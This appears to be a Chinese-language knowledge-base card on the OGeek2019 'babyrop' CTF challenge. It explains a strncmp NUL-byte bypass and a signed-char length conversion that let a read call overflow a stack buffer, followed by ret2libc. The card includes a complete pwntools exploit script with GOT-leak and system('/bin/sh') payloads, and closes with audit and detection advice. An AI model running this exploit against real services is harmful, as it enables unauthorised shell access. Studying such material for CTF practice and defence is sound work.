---
id: binary-pwn-stack-strncmp-nullbypass-buf7-length-read-overflow-ret2libc
title: strncmp 用 strlen(NUL 截断) 作比较长度绕过随机数校验，返回 buf[7]=0xff 经 char 转负放大 read 长度溢出 231 缓冲区 ret2libc
type: scenario
domain: binary
path: binary/pwn/stack
technique: strncmp-null-strlen-bypass-returned-byte-length-read-overflow
tags:
- pwn
- stack
- strncmp
- null-byte
- integer-conversion
- ret2libc
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V688
  verified_at: '2026-11-13T16:18:22+08:00'
  notes: 已对照原文与14张图核对：sub_804871F sprintf(随机数)+read(0x20)+buf[v5-1]=0+strncmp(buf,s,strlen(buf))+return (unsigned __int8)buf[7]、main 以 char 接收→sub_80487D0(char a1)、a1==127 分支 0xC8、缓冲区231/偏移235、图13 checksec Full RELRO/No canary/NX/No PIE、图14 exp 与原文一致。补坑复核成立：原文 exp 用 '\x00'+7*\xff(8字节)会被 buf[v5-1]=0 清掉 buf[7]，应多发≥1字节(卡片PoC用 '\x00'+8*\xff)；卡片同时把原文 ret2libc 笔误(system=read+libc.symbols['read'])修正为 libcbase 计算。未验证点：未本机复跑 PoC、libc 版本需按目标匹配
url: /docs/binary/pwn/stack/binary-pwn-stack-strncmp-nullbypass-buf7-length-read-overflow-ret2libc/
draft: false
kb_aliases:
- OGeek2019 babyrop
- babyrop
- strncmp 00 截断
- strlen 为 0 绕过比较
- buf[7] 控制 read 长度
- unsigned char 转 char -1
- 返回值当读长度
---

## 一句话结论

程序把 `/dev/urandom` 随机数 `sprintf` 成字符串后与用户输入做 `strncmp(buf, s, strlen(buf))`：只要首字节发送 `\x00`，`strlen(buf)=0`，`strncmp(...,0)` 恒为相等，随机数校验被绕过；随后函数返回 `(unsigned __int8)buf[7]` 作为下一次 `read` 的长度，令 `buf[7]=0xff`（255）→ 调用方以 `char` 接收变成 -1 → `read` 的 `size_t` 长度被符号扩展成极大值，读入远超 231 字节的缓冲区，覆盖返回地址后走 ret2libc。

## 原理

- **随机数校验的实现**：`sub_804871F(a1)` 中先 `sprintf(s, "%ld", a1)` 把随机数转成十进制字符串，再 `read(0, buf, 0x20)`、`buf[v5-1]=0`、`v1 = strlen(buf)`，最后 `if (strncmp(buf, s, v1)) exit(0);`。比较长度 `v1` 来自攻击者输入的 `strlen`，而不是随机数串的长度。
- **NUL 截断绕过**：输入首字节为 `\x00` 时 `strlen(buf)=0`，`strncmp(buf, s, 0)` 按 C 标准返回 0（不比较任何字符），直接判定“相等”并输出 `Correct`；随机数内容完全无关。第二个字节起可任意填充，用于摆放后续长度字节。
- **返回长度来自攻击者缓冲区**：函数最后 `return (unsigned __int8)buf[7];`，调用方 `sub_80487D0(char a1)` 再以 `char` 接收这个值。`buf[7]` 是可控字节：取 `0xff` 时，`(unsigned __int8)` 为 255，传入 `char a1` 后为 -1（常见有符号 char 实现）。
- **长度放大**：`sub_80487D0` 逻辑为 `if (a1 == 127) read(0, buf, 0xC8); else read(0, buf, a1);`，其中 `buf[231]`。`a1=-1` 不等于 127，进入 `read(0, buf, a1)`；`read` 第三参数是 `size_t`，`-1` 被符号扩展/转换为 `0xFFFFFFFF`（32 位下），实际读取长度只受发送数据量与换行限制，235 字节以上的 payload 即可覆盖 buf[231] 后的 saved ebp 与返回地址。
- **为什么不用 127**：`a1 == 127` 分支固定读 0xC8=200 字节，小于 231，不溢出；必须利用负长度放大分支。
- **`buf[v5-1]=0` 的偏移坑**：该语句会把本次 `read` 返回的最后一个字节清零。若恰好发送 8 字节（`\x00` + 7 个 `\xff`），`v5=8`，`buf[7]` 被清零，返回值变成 0，后续不会读入数据。实际应多发至少 1 字节，让 NUL 落在 `buf[8]`（例如 `\x00` + 8 个 `\xff`，或带换行使 `v5=9`），保证 `buf[7]=0xff`；原文 exp 写作 7 个 `\xff`，按其反汇编应在目标上核对每次 `read` 实际返回长度。
- **ret2libc**：第二次读入时先用 `write`/`printf` 泄露 GOT（原文 `write(1, read@got, 4)` 并返回 main 重新进入），算出 libc base 后再溢出调用 `system("/bin/sh")`。

## 触发条件

- 32 位 ELF（原文 Full RELRO、No canary、NX、No PIE），存在“随机串比较 + 返回值/缓冲区字节作为下次读取长度”的代码。
- 第一次读取的缓冲区首字节可控且比较长度取自 `strlen(输入)`（strncmp/strcmp），可被 NUL 截断。
- 第二次读取的缓冲区小于可控长度（本例 231 字节），且负长度会被转换为无符号大数。
- 已获得目标 libc（或可先通过 write/printf 泄露 GOT）；有可返回的 main/读取入口以便二次利用。

## 利用步骤

1. 反汇编确认：随机数 `sprintf` 比较函数返回 `buf[7]`、调用方用 `char` 接收并传给 `read`；记录第二次缓冲区大小与返回地址偏移（原文 231 + 4 = 235）。
2. 第一次输入：`b'\x00' + b'\xff'*8`（多发 1 字节防止 `buf[v5-1]=0` 清掉 `buf[7]`），等待 `Correct`。
3. 第二次输入（泄露）：`b'a'*235 + p32(write_plt) + p32(main) + p32(1) + p32(read_got) + p32(4)`，读取 4 字节 GOT 得到 `read` 实际地址，计算 libc base、`system`、`/bin/sh`。
4. 重复第 2 步绕过校验，第二次输入换为 `b'a'*235 + p32(system) + b'a'*4 + p32(binsh)`，函数返回进入 `system("/bin/sh")`。
5. 若失败：确认 `buf[7]` 未被清零（调整多发的字节数）、libc 版本偏移、栈对齐（必要时加 ret gadget）。

## PoC

```python
from pwn import *

context(arch='i386', log_level='debug')
p = remote('target', 28775)
elf = ELF('./pwn')
libc = ELF('./libc.so')
write_plt = elf.symbols['write']
read_got = elf.got['read']
main = 0x08048825

bypass = b'\x00' + b'\xff' * 8      # 首字节 NUL 绕过 strncmp；多发 1 字节保住 buf[7]=0xff

p.send(bypass)
p.recvuntil(b'Correct\n')

# 泄露 read@got
p.send(b'a' * 235 + p32(write_plt) + p32(main) + p32(1) + p32(read_got) + p32(4))
read_addr = u32(p.recv(4))
libc_base = read_addr - libc.symbols['read']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))

p.send(bypass)
p.recvuntil(b'Correct\n')
p.send(b'a' * 235 + p32(system) + b'a' * 4 + p32(binsh))
p.interactive()
```

## 变体与关联

- **NUL 绕过同族**：[[binary-pwn-stack-strcmp-nullbyte-read-overflow-ret2backdoor]]、[[binary-pwn-stack-strcmp-nullbyte-local-ptr-backfill-ret2text]]（strcmp/strncmp 遇 `\0` 停止的其它利用）；本卡的区别是“比较长度本身取自 strlen(输入)”且返回值被用作下一次读长度。
- **长度来自返回值/字节**：[[binary-pwn-stack-snprintf-return-length-read-overflow]]（snprintf 返回值当 read 长度）、[[binary-pwn-stack-negative-one-length-uint8-truncation-oob-copy]]（-1 存入 uint8 变 255）、[[binary-pwn-stack-uint8-strlen-truncation-length-check-strcpy-ret2text]]（uint8 截断绕过区间检查）。
- **变体**：`buf[7]` 也可取其它值把长度控制在任意 0..255；若 `char` 无符号实现，0xff 会变成 255 而非 -1，需改用 `a1==127` 之外的可控大值或别的入口；有 canary/PIE 时需先泄露或换用部分覆盖。
- **边界**：比较用 `memcmp` 固定长度、或 `buf[v5-1]=0` 后仍按实际长度校验时不成立；目标 libc 与 gadget 需匹配。

## 检测与防御

- **代码审计**：随机数/口令校验不要用攻击者可控的 `strlen(输入)` 作为 `strncmp` 长度；比较前先校验最小长度并固定比较长度（`memcmp` 或 `strncmp(..., 固定长度)`）。
- **长度处理**：从输入字节推导读取长度时使用无符号类型并做上界校验；`read` 长度不得超过目标缓冲区；用 `-fstack-protector-strong`、PIE、NX、Full RELRO。
- **检测**：请求首字节为 `\x00` 且长度短于随机串、随后出现超长 payload；二进制中出现“返回缓冲区某字节→read 长度”的调用模式；进程崩溃时返回地址落在 plt/main 附近。
- **响应**：检查核心转储中 read 长度寄存器与源缓冲区，定位长度放大点；对同类“返回值当长度”的代码做全量审计。
